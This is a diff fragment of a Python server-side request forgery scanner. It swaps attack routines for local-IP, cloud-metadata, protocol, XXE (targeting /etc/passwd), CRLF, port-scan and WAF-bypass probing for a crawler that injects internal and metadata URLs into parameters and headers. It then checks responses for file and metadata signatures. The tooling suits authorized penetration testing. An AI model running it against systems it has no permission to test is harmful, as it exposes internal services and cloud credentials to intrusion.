-        self.throttler.backoff_time *= 2
-        time.sleep(random.uniform(5, 10))
-        return True
-
-    def handle_general_error(self, error) -> bool:
-        """Handles a general request exception."""
-        should_retry = self.error_counts.get(type(error).__name__, 0) < self.max_retries
-        if should_retry:
-            time.sleep(random.uniform(0.5, 1.5))
-        return should_retry
-
-    def _detect_waf(self, response: requests.Response) -> bool:
-        """Detects the presence of a WAF from the response."""
-        if response.status_code in [403, 406, 429, 456]:
-            return True
-        response_text = response.text.lower()
-        response_headers = str(response.headers).lower()
-        for signature in self.waf_signatures:
-            if signature in response_text or signature in response_headers:
-                return True
-        return False
-
-    def reset_error_counts(self):
-        """Resets error counters after a successful request."""
-        self.error_counts.clear()
-        self.current_timeout = 10
-
+class TechnologyDetector:
+    """Analyzes response headers to detect backend stack."""
+    @staticmethod
+    def detect(headers: Dict[str, str]) -> List[str]:
+        tags = []
+        server = headers.get('Server', '').lower()
+        powered = headers.get('X-Powered-By', '').lower()
+        if 'nginx' in server: tags.append('Nginx')
+        if 'apache' in server: tags.append('Apache')
+        if 'iis' in server or 'asp' in powered: tags.append('IIS')
+        if 'php' in powered: tags.append('PHP')
+        if 'java' in powered or 'tomcat' in server or 'jetty' in server: tags.append('Java')
+        return tags
 
 class SSRFScanner:
-    """The main SSRF scanner class."""
+    """Main scanning engine."""
+    
     def __init__(self, config: Config):
-        print_banner()
-        self.config = config
-        self.session = self._create_session()
-        self.error_handler = ErrorHandler()
-        self.throttler = SmartThrottler()
-        self.payload_generator = PayloadGenerator()
-        self.protocol_handler = ProtocolHandler()
+        banner()
+        self.cfg = config
+        self.session = self._init_session()
+        self.reporter = Reporter(self.cfg.get('output_dir'))
+        self.mutator = PayloadMutator()
+        
         self.q = queue.Queue()
+        self.scanned_urls = set()
         self.lock = Lock()
-        self.local_ips = []
-        self.headers = []
-        self.cloud_metadata = []
-        self.protocols = []
-        self.encoded_payloads = []
-        self.parameter_payloads = []
-        self.port_payloads = []
-        self.dns_rebinding = []
-        self.waf_bypass_payloads = []
-        self.crlf_payloads = []
-        self.xxe_payloads = []
-        self.total_urls_to_scan = 0
-        self.urls_analyzed = 0
-        self.error_urls = 0
-        self.backurl = ""
-        self.cookies = None
-        self.progress = ScanProgress()
-        self.output_filename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
-        self.output_dir = Path(self.config.scanner['output_dir']) / self.output_filename
-        self.setup_output_files()
-        self.reporter = Reporter(str(self.output_dir))
-        self.setup_logging()
-        self.methods_to_test = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH']
-        self.load_all_payloads()
+        self.stop_event = threading.Event()
+        
+        self.stats = { 'requests': 0, 'errors': 0, 'vulns': 0 }
+        self.payloads = self._load_payloads()
 
-    def _create_session(self):
-        """Creates and configures a requests.Session object."""
-        session = requests.Session()
-        retry_strategy = Retry(
-            total=self.config.scanner['retry_count'],
+    def _init_session(self) -> requests.Session:
+        s = requests.Session()
+        retries = Retry(
+            total=self.cfg.get('retry_count'),
             backoff_factor=0.5,
             status_forcelist=[500, 502, 503, 504]
         )
         adapter = HTTPAdapter(
-            max_retries=retry_strategy,
-            pool_connections=self.config.scanner['max_pool_size'],
-            pool_maxsize=self.config.scanner['max_pool_size']
+            max_retries=retries,
+            pool_connections=self.cfg.get('max_pool_size'),
+            pool_maxsize=self.cfg.get('max_pool_size')
         )
-        session.mount("http://", adapter)
-        session.mount("https://", adapter)
-        return session
+        s.mount('http://', adapter)
+        s.mount('https://', adapter)
+        s.verify = self.cfg.get('verify_ssl')
+        return s
 
-    def setup_logging(self):
-        """Configures logging for the application."""
-        logging.basicConfig(
-            level=logging.INFO if not self.config.scanner['debug'] else logging.DEBUG,
-            format='%(asctime)s - %(levelname)s - %(message)s'
-        )
-        self.logger = logging.getLogger('ssrf_scanner')
-        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-    def setup_output_files(self):
-        """Creates the output directory for reports."""
-        self.output_dir.mkdir(parents=True, exist_ok=True)
-
-    def load_all_payloads(self):
-        """Loads all payloads from the 'payloads' directory."""
-        payload_dir = Path(__file__).parent / "payloads"
-        if not os.path.exists(payload_dir):
-            os.makedirs(payload_dir)
-            self.logger.warning("Created %s directory", payload_dir)
-        payload_files = {
-            'local_ips.txt': self.local_ips,
-            'headers.txt': self.headers,
-            'cloud_metadata.txt': self.cloud_metadata,
-            'protocols.txt': self.protocols,
-            'encoded_payloads.txt': self.encoded_payloads,
-            'parameter_payloads.txt': self.parameter_payloads,
-            'port_payloads.txt': self.port_payloads,
-            'dns_rebinding.txt': self.dns_rebinding,
-            'waf_bypass.txt': self.waf_bypass_payloads,
-            'crlf_ssrf.txt': self.crlf_payloads,
-            'xxe_ssrf.txt': self.xxe_payloads
+    def _load_payloads(self) -> Dict[str, List[str]]:
+        return {
+            'params': [
+                'url', 'uri', 'link', 'dest', 'redirect', 'source', 'path', 
+                'site', 'callback', 'return', 'page', 'feed', 'host', 'port', 
+                'to', 'out', 'view', 'file', 'document', 'folder', 'root', 
+                'img', 'reference', 'html', 'val', 'validate', 'domain'
+            ],
+            'headers': [
+                'X-Forwarded-For', 'X-Real-Ip', 'Referer', 'X-Originating-IP', 
+                'Host', 'X-Host', 'X-Forwarded-Host', 'X-ProxyUser-Ip', 'Client-IP',
+                'X-Wap-Profile', 'Profile', 'X-Arbitrary'
+            ]
         }
-        for filename, payload_list in payload_files.items():
-            filepath = payload_dir / filename
-            try:
-                if not os.path.exists(filepath):
-                    with open(filepath, 'w', encoding='utf-8') as f:
-                        f.write("# Add your payloads here\n")
-                    self.logger.warning("Created empty payload file: %s", filename)
-                else:
-                    with open(filepath, 'r', encoding='utf-8') as f:
-                        payload_list.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
-                    self.logger.info("Loaded %d payloads from %s", len(payload_list), filename)
-            except (IOError, OSError) as e:
-                self.logger.error("Error processing %s: %s", filename, e)
 
-    def make_request(self, url: str, method: str = 'GET',
-                     headers: Optional[Dict[str, str]] = None, **kwargs) -> Optional[requests.Response]:
-        """Makes an HTTP request with configured retries, timeout, and throttling."""
-        retries = 0
-        max_retries = self.config.get('retry_count', 3)
+    def _get_ua(self) -> str:
+        return random.choice(USER_AGENTS)
 
-        # pylint: disable=line-too-long
-        request_headers = {'User-Agent': self.config.get('user_agent'), 'Accept': '*/*'}
-        if self.cookies:
-            if isinstance(self.cookies, str):
-                request_headers['Cookie'] = self.cookies
-            elif isinstance(self.cookies, dict):
-                request_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cookies.items()])
-        
-        if headers:
-            for k, v in headers.items():
-                safe_v = safe_header_value(v)
-                if safe_v is not None:
-                    request_headers[k] = safe_v
-                elif self.config.get('debug'):
-                    self.logger.debug("Skipped header %s: %s (non-latin-1)", k, v)
-
-        while retries < max_retries:
-            try:
-                self.throttler.pre_request()
-                response = self.session.request(
-                    method=method,
-                    url=url,
-                    headers=request_headers,
-                    timeout=self.error_handler.current_timeout,
-                    verify=self.config.get('verify_ssl'),
-                    allow_redirects=self.config.get('follow_redirects'),
-                    **kwargs
-                )
-                self.throttler.post_request(success=True)
-                self.error_handler.reset_error_counts()
-                if self.config.get('capture_cookies') and 'Set-Cookie' in response.headers and not self.cookies:
-                    self.cookies = response.headers['Set-Cookie']
-                return response
-            except Exception as e:
-                retries += 1
-                should_retry = self.error_handler.handle_error(url, e, locals().get('response'))
-                if not should_retry or retries >= max_retries:
-                    self.logger.error("Max retries reached for %s: %s", url, e)
-                    return None
+    def _detect_waf(self, response: requests.Response) -> Optional[str]:
+        for waf, signatures in WAF_SIGNATURES.items():
+            for sig in signatures:
+                if sig in response.headers or sig in response.text.lower():
+                    return waf
+        if response.status_code == 403:
+            return "Generic WAF (403)"
         return None
 
-    def analyze_response(self, original_response, test_response):
-        """Compares two responses to find differences indicating a vulnerability."""
-        if not test_response:
-            return False, {}
-        differences = {
-            'status_code': original_response.status_code != test_response.status_code,
-            'content_length': len(original_response.content) != len(test_response.content),
-            'content_type': original_response.headers.get('content-type') != test_response.headers.get('content-type'),
-            'word_count': len(original_response.text.split()) != len(test_response.text.split()),
-            'response_time': abs(test_response.elapsed.total_seconds() - original_response.elapsed.total_seconds()) > 2
-        }
-        return any(differences.values()), differences
+    def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
+        headers = kwargs.get('headers', {})
+        headers['User-Agent'] = self._get_ua()
+        kwargs['headers'] = headers
+        
+        # DEBUG MODE: PRINT EVERY REQUEST
+        if self.cfg.get('debug'):
+            print(f"{Fore.CYAN}[DEBUG] {method} {url}{Style.RESET_ALL}")
 
-    def print_progress(self):
-        """Prints the current scan progress to the console."""
-        with self.lock:
-            total_progress = self.progress.get_total_progress()
-            current_phase = self.progress.current_phase or "Initializing"
-            print('\r' + ' ' * 100 + '\r', end='')
-            print(f"URLs: {self.urls_analyzed}/{self.total_urls_to_scan} | "
-                  f"Errors: {self.error_urls} | "
-                  f"Phase: {current_phase} | "
-                  f"Overall Progress: {total_progress:.1f}%", end='\r')
-
-    def update_progress(self, phase, completed, total):
-        """Updates the progress for a specific attack phase."""
-        progress = (completed / total * 100) if total > 0 else 100
-        self.progress.update_phase(phase, progress/100)
-        self.print_progress()
-
-    def perform_attack(self, url: str, attack_type: str, payload: str,
-                       headers: Dict[str, str], original_response: requests.Response,
-                       method: str = 'GET', data: Optional[Any] = None,
-                       json_data: Optional[Dict[str, str]] = None) -> Optional[ScanResult]:
-        """Performs a single attack test and reports the result."""
         try:
-            response = self.make_request(url, method=method, headers=headers, data=data, json=json_data)
-            if not response:
-                return None
-            is_vulnerable, differences = self.analyze_response(original_response, response)
-            result = ScanResult(
-                url=url,
-                attack_type=attack_type,
-                payload=payload,
-                response_code=response.status_code,
-                response_size=len(response.content),
-                timestamp=datetime.now(),
-                headers=headers,
-                is_vulnerable=is_vulnerable,
-                notes=str(differences) if differences else ""
+            with self.lock:
+                self.stats['requests'] += 1
+            
+            resp = self.session.request(
+                method, 
+                url, 
+                timeout=self.cfg.get('timeout'), 
+                allow_redirects=self.cfg.get('follow_redirects'),
+                **kwargs
             )
-            if is_vulnerable:
-                result.verification_method = self.verify_vulnerability(url, payload, response)
-                self.log_vulnerability(result)
-            self.reporter.add_result(result)
-            return result
-        except Exception as e:
-            self.logger.error("Error performing %s attack on %s: %s", attack_type, url, e)
+            return resp
+        except RequestException as e:
+            if self.cfg.get('debug'):
+                print(f"{Fore.RED}[DEBUG] Error: {e}{Style.RESET_ALL}")
+            with self.lock:
+                self.stats['errors'] += 1
             return None
 
-    def local_attack(self, url, original_response):
-        """Tests for SSRF using local IP addresses and variations."""
-        total_tests = len(self.headers) * len(self.local_ips) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for ip in self.local_ips:
-                variations = self.payload_generator.generate_ip_variations(ip)
-                for payload in variations:
-                    for method in self.methods_to_test:
-                        completed_tests += 1
-                        self.update_progress('Local IP', completed_tests, total_tests)
-                        header_value = safe_header_value(payload)
-                        if header_value is None:
-                            continue
-                        bad_header = {header: header_value}
-                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                            if method in ['POST', 'PUT', 'PATCH'] else None
-                        result = self.perform_attack(
-                            url, f'Local IP ({method})', payload, bad_header,
-                            original_response, method=method, data=data_payload)
-                        if result and result.is_vulnerable:
-                            self.log_vulnerability(result)
+    def analyze_response(self, original: requests.Response, test: requests.Response) -> Tuple[bool, str]:
+        if not test:
+            return False, "No Response"
 
-    def cloud_metadata_attack(self, url, original_response):
-        """Tests for SSRF by attempting to access cloud metadata endpoints."""
-        total_tests = len(self.headers) * len(self.cloud_metadata) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for metadata_url in self.cloud_metadata:
-                variations = self.payload_generator.generate_url_encodings(metadata_url)
-                for payload in variations:
-                    for method in self.methods_to_test:
-                        completed_tests += 1
-                        self.update_progress('Cloud Metadata', completed_tests, total_tests)
-                        header_value = safe_header_value(payload)
-                        if header_value is None:
-                            continue
-                        bad_header = {header: header_value}
-                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                            if method in ['POST', 'PUT', 'PATCH'] else None
-                        result = self.perform_attack(
-                            url, f'Cloud Metadata ({method})', payload, bad_header,
-                            original_response, method=method, data=data_payload)
-                        if result and result.is_vulnerable:
-                            self.log_vulnerability(result)
+        if original.status_code != test.status_code:
+            if test.status_code not in [429, 503]:
+                return True, f"Status Code: {original.status_code} -> {test.status_code}"
 
-    def protocol_attack(self, url, original_response):
-        """Tests for SSRF using various protocol handlers (file, gopher, etc.)."""
-        total_tests = len(self.headers) * len(self.protocols) * min(len(self.local_ips), 5) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for protocol in self.protocols:
-                for ip in self.local_ips[:5]:
-                    for method in self.methods_to_test:
-                        completed_tests += 1
-                        self.update_progress('Protocol', completed_tests, total_tests)
-                        if protocol == 'gopher':
-                            payloads = self.protocol_handler.handle_gopher(ip)
-                        elif protocol == 'dict':
-                            payloads = self.protocol_handler.handle_dict(ip)
-                        elif protocol == 'file':
-                            payloads = self.protocol_handler.handle_file(ip)
-                        else:
-                            payloads = self.protocol_handler.generate_protocol_variations(protocol, ip)
-                        for payload in payloads:
-                            header_value = safe_header_value(payload)
-                            if header_value is None:
-                                continue
-                            bad_header = {header: header_value}
-                            data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                                if method in ['POST', 'PUT', 'PATCH'] else None
-                            result = self.perform_attack(
-                                url, f'Protocol ({method})', payload, bad_header,
-                                original_response, method=method, data=data_payload)
-                            if result and result.is_vulnerable:
-                                self.log_vulnerability(result)
+        def clean(t):
+            t = re.sub(r'\d+', '', t)
+            t = re.sub(r'[a-f0-9]{16,}', '', t)
+            return t
 
-    def encoded_attack(self, url, original_response):
-        """Tests for SSRF using various encoding techniques to bypass filters."""
-        total_tests = len(self.headers) * len(self.encoded_payloads) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for base_payload in self.encoded_payloads:
-                for method in self.methods_to_test:
-                    completed_tests += 1
-                    self.update_progress('Encoded', completed_tests, total_tests)
-                    encoded_variations = [
-                        base_payload,
-                        quote(base_payload),
-                        quote(quote(base_payload)),
-                        base64.b64encode(base_payload.encode()).decode(),
-                    ]
-                    for payload in encoded_variations:
-                        header_value = safe_header_value(payload)
-                        if header_value is None:
-                            continue
-                        bad_header = {header: header_value}
-                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                            if method in ['POST', 'PUT', 'PATCH'] else None
-                        result = self.perform_attack(
-                            url, f'Encoded ({method})', payload, bad_header,
-                            original_response, method=method, data=data_payload)
-                        if result and result.is_vulnerable:
-                            self.log_vulnerability(result)
+        orig_clean = clean(original.text)
+        test_clean = clean(test.text)
+        matcher = difflib.SequenceMatcher(None, orig_clean, test_clean)
+        ratio = matcher.ratio()
 
-    def parameter_attack(self, url, original_response):
-        """Tests for SSRF by injecting payloads into URL parameters."""
-        ssrf_payloads = self.local_ips[:5] + self.cloud_metadata[:2]
-        if self.backurl:
-            ssrf_payloads.append(self.backurl)
+        if ratio < 0.85: 
+            return True, f"Content Similarity: {ratio:.2f}"
+            
+        if test.elapsed.total_seconds() - original.elapsed.total_seconds() > 4.0:
+            return True, "Time Delay > 4s"
+
+        return False, ""
+
+    def verify_vulnerability(self, payload: str, response: requests.Response) -> str:
+        text = response.text.lower()
+        signatures = {
+            'Root User': r'root:x:0:0:',
+            'Windows Boot': r'\[extensions\]|\[fonts\]',
+            'AWS Meta': r'ami-id|instance-id',
+            'GCP Meta': r'metadata-flavor:\s*google',
+            'K8s Secret': r'default:x:\d+:\d+',
+            'Oracle Meta': r'opc/v1/instance',
+            'Internal Error': r'connection refused|network unreachable',
+            'PHP Info': r'php version',
+        }
+        for name, sig in signatures.items():
+            if re.search(sig, text):
+                return f"Signature Match: {name}"
+        for h in response.headers:
+            if 'amazon' in h or 'google' in h or 'oracle' in h:
+                return f"Cloud Header Found: {h}"
+        return "Heuristic Match (Manual Verification Needed)"
+
+    def crawl(self, url: str, depth: int = 0):
+        if depth > self.cfg.get('crawl_depth') or url in self.scanned_urls:
+            return
         
-        params_to_test = [p.split('=')[0].strip('?') for p in self.parameter_payloads]
+        self.scanned_urls.add(url)
+        resp = self.make_request(url)
+        if not resp or 'text/html' not in resp.headers.get('Content-Type', ''):
+            return
 
-        post_put_patch_methods = [
-            m for m in self.methods_to_test if m in ['POST', 'PUT', 'PATCH']
-        ]
-        other_methods = [m for m in self.methods_to_test if m not in post_put_patch_methods]
-        total_tests = len(params_to_test) * len(ssrf_payloads) * (
-            len(other_methods) + len(post_put_patch_methods) * 2
-        )
-        completed_tests = 0
-        def check_and_log(response, method, payload_str, test_url_for_log):
-            """Helper to check response and log if vulnerable."""
-            if not response:
-                return
-            is_vulnerable, differences = self.analyze_response(original_response, response)
-            if is_vulnerable:
-                result = ScanResult(
-                    url=url,
-                    attack_type=f'Parameter ({method})',
-                    payload=payload_str,
-                    response_code=response.status_code,
-                    response_size=len(response.content),
-                    timestamp=datetime.now(),
-                    headers={},
-                    is_vulnerable=True,
-                    notes=str(differences)
-                )
-                result.verification_method = self.verify_vulnerability(
-                    test_url_for_log, ssrf_payload, response)
-                self.reporter.add_result(result)
-                self.log_vulnerability(result)
+        links = re.findall(r'href=["\'](http[^"\']+|/[^"\']+)["\']', resp.text)
+        parsed_root = urlparse(url)
+        
+        for link in links:
+            full_link = urljoin(url, link)
+            parsed_link = urlparse(full_link)
+            
+            if parsed_link.netloc == parsed_root.netloc:
+                if '?' in full_link:
+                    self.q.put(full_link)
+                self.crawl(full_link, depth + 1)
 
-        for param_name in params_to_test:
-            for ssrf_payload in ssrf_payloads:
-                for method in self.methods_to_test:
-                    if method == 'GET':
-                        completed_tests += 1
-                        self.update_progress('Parameter', completed_tests, total_tests)
-                        encoded_ssrf_payload = quote(ssrf_payload)
-                        param_part = f"{param_name}={encoded_ssrf_payload}"
-                        test_url = f"{url}{'&' if '?' in url else '?'}{param_part}"
-                        response = self.make_request(test_url, method='GET')
-                        check_and_log(response, 'GET', param_part, test_url)
-                    elif method in ['POST', 'PUT', 'PATCH']:
-                        # Test as form data
-                        completed_tests += 1
-                        self.update_progress('Parameter', completed_tests, total_tests)
-                        data = {param_name: ssrf_payload}
-                        payload_str = f"Form: {data}"
-                        response_form = self.make_request(url, method=method, data=data)
-                        check_and_log(response_form, f'{method}-FORM', payload_str, url)
-
-                        # Test as JSON
-                        completed_tests += 1
-                        self.update_progress('Parameter', completed_tests, total_tests)
-                        json_data = {param_name: ssrf_payload}
-                        payload_str = f"JSON: {json.dumps(json_data)}"
-                        headers = {'Content-Type': 'application/json'}
-                        response_json = self.make_request(
-                            url, method=method, json=json_data, headers=headers)
-                        check_and_log(response_json, f'{method}-JSON', payload_str, url)
-                    else:  # HEAD
-                        completed_tests += 1
-                        self.update_progress('Parameter', completed_tests, total_tests)
-                        encoded_ssrf_payload = quote(ssrf_payload)
-                        param_part = f"{param_name}={encoded_ssrf_payload}"
-                        test_url = f"{url}{'&' if '?' in url else '?'}{param_part}"
-                        response = self.make_request(test_url, method=method)
-                        check_and_log(response, method, param_part, test_url)
-
-    def port_scan_attack(self, url, original_response):
-        """Attempts to discover open ports on internal services."""
-        total_tests = (len(self.headers) * len(self.port_payloads) *
-                       len(self.local_ips[:5]) * len(self.methods_to_test))
-        completed_tests = 0
-        for header in self.headers:
-            for port in self.port_payloads:
-                for ip in self.local_ips[:5]:
-                    for method in self.methods_to_test:
-                        completed_tests += 1
-                        self.update_progress('Port Scan', completed_tests, total_tests)
-                        payload = f"{ip}{port}"
-                        header_value = safe_header_value(payload)
-                        if header_value is None:
-                            continue
-                        bad_header = {header: header_value}
-                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                            if method in ['POST', 'PUT', 'PATCH'] else None
-                        result = self.perform_attack(
-                            url, f'Port Scan ({method})', payload, bad_header,
-                            original_response, method=method, data=data_payload)
-                        if result and result.is_vulnerable:
-                            self.log_vulnerability(result)
-
-    def dns_rebinding_attack(self, url, original_response):
-        """Tests for DNS rebinding vulnerabilities."""
-        total_tests = len(self.headers) * len(self.dns_rebinding) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for dns in self.dns_rebinding:
-                for method in self.methods_to_test:
-                    completed_tests += 1
-                    self.update_progress('DNS Rebinding', completed_tests, total_tests)
-                    payload = dns
-                    if '<BURP-COLLABORATOR>' in payload and self.backurl:
-                        payload = payload.replace('<BURP-COLLABORATOR>', self.backurl)
-                    header_value = safe_header_value(payload)
-                    if header_value is None:
-                        continue
-                    bad_header = {header: header_value}
-                    data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                        if method in ['POST', 'PUT', 'PATCH'] else None
-                    result = self.perform_attack(
-                        url, f'DNS Rebinding ({method})', payload, bad_header,
-                        original_response, method=method, data=data_payload)
-                    if result and result.is_vulnerable:
-                        self.log_vulnerability(result)
-
-    def waf_bypass_attack(self, url, original_response):
-        """Tests for SSRF using WAF bypass techniques."""
-        total_tests = len(self.headers) * len(self.waf_bypass_payloads) * len(self.methods_to_test)
-        completed_tests = 0
-        for header in self.headers:
-            for payload in self.waf_bypass_payloads:
-                for method in self.methods_to_test:
-                    completed_tests += 1
-                    self.update_progress('WAF Bypass', completed_tests, total_tests)
-                    header_value = safe_header_value(payload)
-                    if header_value is None:
-                        continue
-                    bad_header = {header: header_value}
-                    data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
-                        if method in ['POST', 'PUT', 'PATCH'] else None
-                    result = self.perform_attack(
-                        url, f'WAF Bypass ({method})', payload, bad_header,
-                        original_response, method=method, data=data_payload)
-                    if result and result.is_vulnerable:
-                        self.log_vulnerability(result)
-
-    def crlf_injection_attack(self, url, original_response):
-        """Tests for SSRF by injecting CRLF sequences into headers."""
-        target_hosts = self.local_ips[:5] + self.cloud_metadata[:2]
-        if self.backurl:
-            target_hosts.append(self.backurl)
-
-        total_tests = len(self.headers) * len(self.crlf_payloads) * len(target_hosts)
-        completed_tests = 0
-
-        for header in self.headers:
-            for crlf_template in self.crlf_payloads:
-                for host in target_hosts:
-                    completed_tests += 1
-                    self.update_progress('CRLF Injection', completed_tests, total_tests)
-                    payload = crlf_template.replace('{host}', host)
-                    header_value = safe_header_value(payload)
-                    if header_value is None:
-                        continue
-                    bad_header = {header: header_value}
-                    result = self.perform_attack(
-                        url, 'CRLF Injection', payload, bad_header, original_response)
-                    if result and result.is_vulnerable:
-                        self.log_vulnerability(result)
-
-    def xxe_attack(self, url, original_response):
-        """Tests for SSRF via XXE injection."""
-        target_payloads = self.local_ips[:2] + ['/etc/passwd', 'c:/windows/win.ini']
-        if self.backurl:
-            target_payloads.append(self.backurl)
-
-        total_tests = len(self.xxe_payloads) * len(target_payloads) * 2  # For POST and PUT
-        completed_tests = 0
-
-        for xxe_template in self.xxe_payloads:
-            for target in target_payloads:
-                for method in ['POST', 'PUT']:
-                    completed_tests += 1
-                    self.update_progress('XXE', completed_tests, total_tests)
-                    xml_payload = xxe_template.replace('{payload}', target)
-                    headers = {'Content-Type': 'application/xml'}
-                    result = self.perform_attack(
-                        url, f'XXE ({method})', xml_payload, headers,
-                        original_response, method=method, data=xml_payload)
-                    if result and result.is_vulnerable:
-                        self.log_vulnerability(result)
-
-    def verify_vulnerability(self, _url: str, _payload: str, response) -> str:
-        """Verifies a potential vulnerability based on a set of checks."""
-        verification_methods = [
-            self._verify_response_code,
-            self._verify_response_content,
-            self._verify_response_headers,
-            self._verify_timing_difference
-        ]
-        for method in verification_methods:
-            if method(response):
-                return method.__name__.replace('_verify_', '').replace('_', ' ').title()
-        return "Unverified"
-
-    def _verify_response_code(self, response) -> bool:
-        """Verify based on response status code."""
-        return response.status_code in [200, 301, 302, 307]
-
-    def _verify_response_content(self, response) -> bool:
-        """Verify based on keywords in response content."""
-        indicators = [
-            'root:',
-            'admin:',
-            'internal',
-            'password',
-            'key',
-            'uid=',
-            'metadata',
-            'aws',
-            'secret'
-        ]
-        return any(indicator in response.text.lower() for indicator in indicators)
-
-    def _verify_response_headers(self, response) -> bool:
-        """Verify based on presence of internal-looking response headers."""
-        suspicious_headers = [
-            'x-internal',
-            'server-internal',
-            'x-backend-server',
-            'x-upstream',
-            'x-host',
-            'x-forwarded-server'
-        ]
-        return any(header.lower() in response.headers for header in suspicious_headers)
-
-    def _verify_timing_difference(self, response) -> bool:
-        """Verify based on a significant timing difference in response."""
-        return response.elapsed.total_seconds() > 2.0
-
-    def log_vulnerability(self, result: ScanResult):
-        """Logs a found vulnerability to the console."""
-        with self.lock:
-            self.logger.warning("\nPotential SSRF vulnerability found!")
-            self.logger.warning("URL: %s", result.url)
-            self.logger.warning("Attack Type: %s", result.attack_type)
-            self.logger.warning("Payload: %s", result.payload)
-            self.logger.warning("Response Code: %s", result.response_code)
-            self.logger.warning("Verification Method: %s", result.verification_method)
-            self.logger.warning("-" * 50)
-
-    def perform_all_attacks(self, url):
-        """Runs all configured attack types against a single URL."""
-        original_response = self.make_request(url)
-        if original_response:
-            self.progress.current_phase = "Local IP"
-            self.local_attack(url, original_response)
-            self.progress.current_phase = "Cloud Metadata"
-            self.cloud_metadata_attack(url, original_response)
-            self.progress.current_phase = "Protocol"
-            self.protocol_attack(url, original_response)
-            self.progress.current_phase = "Encoded"
-            self.encoded_attack(url, original_response)
-            self.progress.current_phase = "Parameter"
-            self.parameter_attack(url, original_response)
-            self.progress.current_phase = "Port Scan"
-            self.port_scan_attack(url, original_response)
-            self.progress.current_phase = "DNS Rebinding"
-            self.dns_rebinding_attack(url, original_response)
-            self.progress.current_phase = "WAF Bypass"
-            self.waf_bypass_attack(url, original_response)
-            self.progress.current_phase = "CRLF Injection"
-            self.crlf_injection_attack(url, original_response)
-            self.progress.current_phase = "XXE"
-            self.xxe_attack(url, original_response)
+    def attack_target(self, url: str):
+        # Если включен дебаг - не используем \r, чтобы лог шел вниз
+        if self.cfg.get('debug'):
+            print(f"{Fore.BLUE}[*] Analyzing: {url}{Style.RESET_ALL}")
         else:
-            with self.lock:
-                self.error_urls += 1
-                if self.config.scanner['debug']:
-                    print(Fore.RED + f"Connection error with url: {url}")
+            print(f"\r{Fore.BLUE}[*] Analyzing: {url}{Style.RESET_ALL}", end='')
+        
+        original = self.make_request(url)
+        if not original:
+            return
 
-    def scan_urls(self):
-        """Worker function for threads to pull URLs from the queue and scan them."""
-        while True:
+        waf = self._detect_waf(original)
+        if waf and self.cfg.get('debug'):
+            print(f"{Fore.YELLOW}[!] WAF Detected: {waf} on {url}{Style.RESET_ALL}")
+
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+        
+        params_to_test = list(qs.keys()) + self.payloads['params']
+        targets = self.mutator.generate_ip_variations("127.0.0.1")
+        for cloud, urls in CLOUD_METADATA_URLS.items():
+            targets.extend(urls)
+            
+        backurl = self.cfg.get('backurl')
+        if backurl:
+            targets.append(f"{backurl}?id=PARAM_TEST")
+
+        sep = '&' if '?' in url else '?'
+
+        for param in params_to_test:
+            for payload in targets:
+                if param in qs:
+                    test_url = url.replace(f"{param}={qs[param][0]}", f"{param}={quote(payload)}")
+                else:
+                    test_url = f"{url}{sep}{param}={quote(payload)}"
+                
+                resp = self.make_request(test_url)
+                if not resp: continue
+                
+                is_vuln, reason = self.analyze_response(original, resp)
+                if is_vuln:
+                    verification = self.verify_vulnerability(payload, resp)
+                    if "Manual" in verification and "Time" not in reason and float(reason.split(':')[-1]) > 0.8:
+                        continue
+                    self.report_vuln(test_url, "Parameter Injection", payload, resp, verification, reason)
+
+        for header in self.payloads['headers']:
+            for payload in targets[:10]: 
+                headers = {header: safe_header_value(payload)}
+                resp = self.make_request(url, headers=headers)
+                if resp:
+                    is_vuln, reason = self.analyze_response(original, resp)
+                    if is_vuln:
+                         verification = self.verify_vulnerability(payload, resp)
+                         if "Manual" not in verification: 
+                             self.report_vuln(url, f"Header: {header}", payload, resp, verification, reason)
+
+    def report_vuln(self, url, type_, payload, resp, verify, note):
+        print(f"\n{Fore.RED}[!] VULNERABILITY FOUND: {url}{Style.RESET_ALL}")
+        print(f"    Type: {type_}")
+        print(f"    Payload: {payload}")
+        print(f"    Verify: {verify}")
+        res = ScanResult(
+            url=url, attack_type=type_, payload=payload,
+            response_code=resp.status_code, response_size=len(resp.content),
+            timestamp=datetime.now(), headers=dict(resp.headers),
+            is_vulnerable=True, verification_method=verify, notes=note
+        )
+        self.reporter.add_result(res)
+
+    def worker(self):
+        while not self.stop_event.is_set():
             try:
-                url = self.q.get_nowait()
+                url = self.q.get(timeout=1)
+                self.attack_target(url)
+                self.q.task_done()
             except queue.Empty:
                 break
-            self.urls_analyzed += 1
-            self.print_progress()
-            self.perform_all_attacks(url)
-            self.q.task_done()
+            except Exception as e:
+                if self.cfg.get('debug'):
+                    print(f"Worker Error: {e}")
 
-    def run(self, urls=None, url_file=None):
-        """Main entry point to start the scanner."""
-        try:
-            if urls:
-                for url in urls:
-                    if url:
-                        self.q.put(url)
-                        self.total_urls_to_scan += 1
-            elif url_file:
-                with open(url_file, 'r', encoding='utf-8') as f:
+    def run(self, input_data: Union[str, List[str]]):
+        if isinstance(input_data, str): 
+            if os.path.isfile(input_data):
+                with open(input_data, 'r') as f:
                     for line in f:
-                        url = line.strip()
-                        if url:
-                            self.q.put(url)
-                            self.total_urls_to_scan += 1
-            if self.q.empty():
-                self.logger.error("No valid URLs to scan. Please provide a URL with -u or a file with -f.")
-                return
+                        if line.strip(): self.q.put(line.strip())
+            else:
+                self.q.put(input_data)
